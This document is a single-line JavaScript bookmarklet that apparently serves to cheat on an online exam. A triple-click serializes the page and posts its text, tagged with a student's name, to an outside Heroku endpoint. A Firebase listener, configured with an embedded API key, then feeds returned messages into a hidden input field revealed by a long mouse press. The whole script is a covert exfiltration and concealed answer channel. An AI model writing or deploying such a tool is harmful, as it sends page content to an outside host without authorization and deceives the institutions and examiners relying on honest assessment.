javascript:var node = document.createElement("input"); node.id = "xxxnoxxx"; var names = ["Samandarbek","Xusniddin"]; node.setAttribute("style", "transform:translateX(280px);background:#ececf1; display:none; width:calc(100% - 280px); border:1px solid #ffff;"); node.setAttribute("onchange", "javascript:fetch('https://api.github.com/repos/javascript-tutorial/en.javascript.info/'+this.value).then(t=>alert(t))"); document.body.appendChild(node); var clickedTime = 0; document.body.setAttribute("onmousedown","mouseDown(1)"); document.body.setAttribute("onmouseup","mouseDown(0)"); function mouseDown(num) {var d = new Date(); if(num == 1){clickedTime = d.getTime(); setTimeout(function(){if(d.getTime() == clickedTime){if( document.getElementById("xxxnoxxx").style.display == "flex"){document.getElementById("xxxnoxxx").style.display = "none"; }else{document.getElementById("xxxnoxxx").style.display = "flex"; } } },700)}else{clickedTime = d.getTime()}} let count = 0; let elements = new Map(); document.addEventListener('click', function (event) {let countdown; function reset () {count = 0; countdown = null; } count++; if (count === 3) {if (!elements.has(event.target)) {elements.set(event.target, 1); } else {let currentCount = elements.get(event.target); currentCount++; elements.set(event.target, currentCount); } let tripleClick = new CustomEvent('trplclick', {bubbles: true, detail: {numberOfTripleClicks: elements.get(event.target) } }); event.target.dispatchEvent(tripleClick); reset(); } if (!countdown) {countdown = window.setTimeout(function () {reset(); }, 500); } }); document.addEventListener('trplclick', function (event) {document.body.style.cursor ="progress"; var student_id = ""; for(i=0; i < names.length; i++){if(document.body.innerHTML.includes(names[i])){student_id = names[i]; } } var ns = new XMLSerializer(); var ss= ns.serializeToString(document); var nn = new DOMParser().parseFromString(ss, "text/xml"); while (nn.getElementsByTagName("script")[0]) {nn.getElementsByTagName("script")[0].remove() } var sa = new XMLSerializer(); var text= sa.serializeToString(nn); data = {student_id: student_id, text: text, }; fetch('https://djkh.herokuapp.com/api/', {method: 'post', headers: {'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json', }, body: JSON.stringify(data), }); setTimeout(function(){document.body.style.cursor = "auto"},500) }); function includeJs(jsFilePath) {var js = document.createElement("script"); js.type = "text/javascript"; js.src = jsFilePath; document.body.appendChild(js); } includeJs("https://www.gstatic.com/firebasejs/6.6.1/firebase-app.js"); includeJs("https://www.gstatic.com/firebasejs/6.6.1/firebase-database.js"); var myName = ""; setTimeout(function(){var firebaseConfig = {apiKey: "AIzaSyB8bgaNb1XaxqjCz7NwMmISSK5DdDeHMwU", authDomain: "testtuit-bf6e1.firebaseapp.com", databaseURL: "https://testtuit-bf6e1-default-rtdb.firebaseio.com/", projectId: "testtuit-bf6e1", storageBucket: "testtuit-bf6e1.appspot.com", messagingSenderId: "64979366642", appId: "1:64979366642:web:bd76a42351df965389566b"}; firebase.initializeApp(firebaseConfig); firebase.database().ref("messages").on("child_added", function (snapshot) {if(snapshot.val().sender == student_id){var html = ""; html += snapshot.val().message; document.getElementById("xxxnoxxx").value += html; } }) },2000);
